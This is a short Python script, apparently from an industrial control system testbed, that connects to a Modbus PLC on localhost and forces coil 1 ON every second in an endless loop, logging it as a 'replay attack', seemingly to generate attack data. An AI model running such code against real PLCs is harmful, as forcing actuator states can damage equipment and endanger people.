
# scripts/attack_injection/replay_attack.py

# Corrected import statement for newer pymodbus versions
try:
    # For newer pymodbus versions (3.0.0+)
    from pymodbus.client import ModbusTcpClient
except ImportError:
    # For older pymodbus versions (prior to 3.0.0)
    from pymodbus.client.sync import ModbusTcpClient

import time
import logging
import os

# Create logs directory if it doesn't exist
os.makedirs('logs/raw', exist_ok=True)

# -- Setup logging
logging.basicConfig(
    filename='logs/raw/replay_attack.log',
    level=logging.INFO,
    format='%(asctime)s %(message)s'
)

# -- Connect to PLC
client = ModbusTcpClient('127.0.0.1', port=502)
client.connect()
logging.info("Replay Attack Started")

# -- Endless loop: force Coil 1 ON every second
try:
    while True:
        result = client.write_coil(1, True)
        if result:
            logging.info("Wrote coil 1 = True")
        else:
            logging.error("Failed to write to coil 1")
        time.sleep(1)
except KeyboardInterrupt:
    logging.info("Replay Attack Stopped by user")
    client.close()
except Exception as e:
    logging.error(f"Error during attack: {str(e)}")
    client.close()